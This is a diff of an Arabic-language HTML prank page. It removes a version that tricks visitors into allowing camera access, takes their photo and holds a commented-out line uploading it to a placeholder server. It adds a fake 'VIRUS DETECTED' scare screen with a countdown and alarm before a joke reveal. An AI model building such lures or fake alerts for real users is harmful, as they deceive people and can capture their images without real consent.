@@ -1,46 +1,25 @@
 <!DOCTYPE html>
 <html>
-<body>
-  <h1>أدخل لترى مفاجأة مضحكة! 😜</h1>
-  <video id="video" width="300" autoplay></video>
-  <button onclick="capture()" style="display: none;">التقط الصورة!</button>
-  
+<body style="background: black; color: red; text-align: center;">
+  <h1>⚠️ VIRUS DETECTED! ⚠️</h1>
+  <p id="countdown">10</p>
+  <audio autoplay loop>
+    <source src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3">
+  </audio>
   <script>
-    const video = document.getElementById('video');
-    let isCameraAllowed = false;
-
-    // طلب إذن الكاميرا
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-        document.querySelector('button').style.display = 'block';
-        isCameraAllowed = true;
-      })
-      .catch(err => {
-        alert('لن تعمل المفاجأة دون إذن الكاميرا!');
-      });
-
-    // التقاط الصورة
-    function capture() {
-      if (!isCameraAllowed) return;
-
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-
-      const img = canvas.toDataURL('image/png');
-      
-      // إرسال الصورة إلى خادمك (مطلوب خادم باك إند)
-      // fetch('YOUR_SERVER_URL', { method: 'POST', body: img });
-      
-      // عرض الصورة للمستخدم كنكتة
-      document.body.innerHTML = `
-        <h1>هاها! انقرطت عليك! 🤣</h1>
-        <img src="${img}" width="300">
-        <p>لن أحتفظ بالصورة، هذه مجرد نكتة!</p>
-      `;
-    }
+    let time = 10;
+    const timer = setInterval(() => {
+      time--;
+      document.getElementById('countdown').textContent = time;
+      if (time === 0) {
+        clearInterval(timer);
+        document.body.innerHTML = `
+          <h1 style="color: green;">😜 انقرطت عليك!</h1>
+          <p>الفيروس الوحيد هنا هو حبك للـMemes!</p>
+          <img src="https://i.imgur.com/4GpL0wY.jpg" width="200">
+        `;
+      }
+    }, 1000);
   </script>
 </body>
 </html>
